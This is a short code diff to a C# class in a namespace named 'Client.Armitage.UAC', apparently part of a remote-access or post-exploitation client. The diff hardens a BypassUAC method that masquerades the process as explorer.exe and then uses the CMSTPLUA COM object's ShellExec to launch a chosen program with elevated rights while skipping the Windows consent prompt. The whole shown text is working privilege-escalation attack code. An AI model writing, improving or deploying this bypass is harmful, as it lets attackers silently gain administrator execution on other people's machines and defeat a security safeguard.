@@ -5,6 +5,7 @@ using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Client.Armitage.UAC
 {
@@ -112,16 +113,20 @@ namespace Client.Armitage.UAC
                 [In] ulong nShow);
         }
 
-        public static void BypassUAC(string targetfile, string args)
+        public static bool BypassUAC(string targetfile, string args)
         {
+            if (!MasqueradePEB.Do(@"C:\windows\explorer.exe")) return false;
+
             // CLSID
-            Guid classId_cmstplua = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
+            Guid classId_cmstplua = new Guid("{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");
             // Interface ID
-            Guid interfaceId_icmluautil = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
+            Guid interfaceId_icmluautil = new Guid("{6EDD6D74-C007-4E75-B76A-E5740995E24C}");
 
             ICMLuaUtil icm = (ICMLuaUtil)LaunchElevatedCOMObject(classId_cmstplua, interfaceId_icmluautil);
             var g = icm.ShellExec(targetfile, args, null, SEE_MASK_DEFAULT, SW_SHOW);
             Marshal.ReleaseComObject(icm);
+
+            return true;
         }
     }
 }
